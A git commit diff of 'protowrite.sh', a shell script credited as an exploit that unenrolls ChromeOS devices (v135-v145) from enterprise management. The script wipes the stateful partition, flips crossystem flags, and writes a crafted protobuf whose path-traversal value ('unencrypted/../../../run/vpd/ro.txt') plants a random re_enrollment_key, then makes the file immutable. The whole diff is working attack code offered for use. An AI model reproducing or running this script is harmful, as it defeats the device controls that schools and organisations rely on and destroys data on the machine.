6b9964347b303668a2bea478a56e5c5770166483
codenerd87 <217143479+codenerd87@users.noreply.github.com>
2026-08-11 12:30:36 -0500

    Update protowrite.sh
    protowrite fixed hopefully (my chromebook wont tunr on)

--- badsh1mmer/scripts/protowrite.sh
+++ badsh1mmer/scripts/protowrite.sh
@@ -1,11 +1,14 @@
 #!/bin/sh
-
 stateful_mount="/stateful"
-
+metadata_mount="/metadata"
 fail(){
 	printf "$1\n"
 	printf "exiting...\n"
 	exit
+}
+
+proto_gaming(){
+	printf '\012\177\012\043unencrypted/../../../run/vpd/ro.txt\020\124\032\126\022\124re_enrollment_key="'"$(hexdump -e '1/1 "%02x"' -v -n 32 /dev/urandom)"'"' | base64 -w0
 }
 
 get_fixed_dst_drive() {
@@ -36,85 +39,88 @@ get_fixed_dst_drive() {
 	echo "${dev}"
 }
 
-get_booted_kernnum() {
-    if $(expr $(cgpt show -n "$intdis" -i 2 -P) > $(cgpt show -n "$intdis" -i 4 -P)); then
-        echo -n 2
-    else
-        echo -n 4
-    fi
-}
-get_booted_rootnum() {
-	expr $(get_booted_kernnum) + 1
-}
-
 wipeandmountstate(){
-  	mkdir -p /localroot 
-	mount ${intdis_prefix}$(get_booted_rootnum) /localroot -o ro
-	# yes i know below is really inefficient, but the other way isnt work and i cant understand why
-	sync # call just in case?
-	mount --bind /dev /localroot/dev
-	mount --bind /proc /localroot/proc
-	mount --bind /sys /localroot/sys
-	mount --bind /run /localroot/run
-	chroot /localroot /sbin/vgchange -ay
-    volgroup=$(chroot /localroot /sbin/vgscan | grep "Found volume group" | awk '{print $4}' | tr -d '"')
+	vgchange -ay >/dev/null 2>&1
+    volgroup=$(vgscan | grep "Found volume group" | awk '{print $4}' | tr -d '"')
 	if [ -b "/dev/$volgroup/unencrypted" ]; then
-		echo "found volume group: $volgroup"
-		mkdir "$stateful_mount"
-		chroot /localroot /sbin/mkfs.ext4 -F /dev/$volgroup/unencrypted
-    	mount /dev/$volgroup/unencrypted "$stateful_mount"
+		echo "Debug: Found volume group: $volgroup"
+		echo
+		mkdir -p "$stateful_mount"
+		echo "Wiping stateful..."
+		mkfs.ext4 -F /dev/$volgroup/unencrypted >/dev/null 2>&1
+        mount /dev/$volgroup/unencrypted "$stateful_mount"
 	else
 		echo "lvm fail, falling back on p1"
-		chroot /localroot /sbin/mkfs.ext4 -F "$intdis_prefix"1 || fail "no stateful could be found/wiped"
-    	mount "$intdis_prefix"1 "$stateful_mount"
+		mkdir -p "$stateful_mount"
+		echo "Wiping stateful..."
+		mkfs.ext4 -F "${intdis_prefix}1" || fail "no stateful could be found/wiped"
+        mount "$intdis_prefix"1 "$stateful_mount"
 	fi
 }
 
 checkcurrentstate(){
     echo "Checking current state..."
-	mkdir /metadata
-    mount "$intdis_prefix"11 /metadata || part1
+	echo
+    mkdir "$metadata_mount"
+    mount "${intdis_prefix}11" "$metadata_mount" >/dev/null 2>&1 || part1
 	part2
 }
 
 part1(){
+	echo "Starting part 1"
+	echo
     wipeandmountstate
     mkdir -p "$stateful_mount"/unencrypted
     touch "$stateful_mount"/unencrypted/.default_key_stateful_migration
     crossystem disable_dev_request=1
     umount "$stateful_mount"
-    echo "Rebooting, please re-run this script after the update finishes. It may update multiple times, you need to wait for all of them to finish"
-    sleep 5
-    reboot -f
+    echo "Ready to reboot. Please re-run this script after the update finishes."
+	echo "It may update multiple times, you need to wait for all of them to finish."
+	echo
+	echo "Run reboot -f to easily reboot"
+	exit 0
 }
 
 part2(){
-	rm -rf /metadata/*
-	sync
-    printf "Cn8KI3VuZW5jcnlwdGVkLy4uLy4uLy4uL3J1bi92cGQvcm8udHh0EFQaVhJUcmVfZW5yb2xsbWVudF9rZXk9IjA0MzIzODMwMjAyNDU3NTYzNDIxNTY5NzMxODQyODE3MjcxNzM5Mjg5MzgyNjUxNzMzNjcwMTIwMDk5MzA0MjMi" | tee /metadata/preseeder.proto
-    chattr +i /metadata/preseeder.proto 
+	echo "Starting part 2"
+	chattr -i "$metadata_mount"/preseeder.proto >/dev/null 2>&1
+	rm -f "$metadata_mount"/preseeder.proto
+    proto_gaming > "$metadata_mount"/preseeder.proto
+    chattr +i "$metadata_mount"/preseeder.proto 
     sync
-    umount /metadata
+    umount "$metadata_mount"
     sync
     crossystem disable_dev_request=1
-    echo "Go through setup, you will be unenrolled"
-    sleep 5
-    reboot -f
+    echo "Ready for another reboot. Go through setup, you will be unenrolled."
+	echo
+	echo "Run reboot -f to easily reboot"
+	exit 0
 }
 
 main(){
-  . /usr/sbin/write_gpt.sh
-  load_base_vars
-  intdis=$(get_fixed_dst_drive)
+    . /usr/sbin/write_gpt.sh
+    load_base_vars
+    intdis=$(get_fixed_dst_drive)
 	if echo "$intdis" | grep -q '[0-9]$'; then
 		intdis_prefix="$intdis"p
 	else
 		intdis_prefix="$intdis"
 	fi
-  clear
-  echo "protowrite: root file write > unenrollment"
-  echo "Exploit by emery, script by con"
-	checkcurrentstate
+	#below is code to prevent this from being run without rebooting in between (part 1 and 2 in the same boot)
+	if [ -f /run/protowriterunthisboot ]; then
+         echo "You have run protowrite this boot."
+		 echo "Please reboot and try again"
+		 exit 1
+    fi
+	touch /run/protowriterunthisboot
+    clear
+	echo "Protowrite by crossystem/emerywi"
+	echo
+	echo "Unenrollment on v135-v145"
+	echo
+	echo "Script written by con"
+	echo
+    checkcurrentstate
 }
 
 main
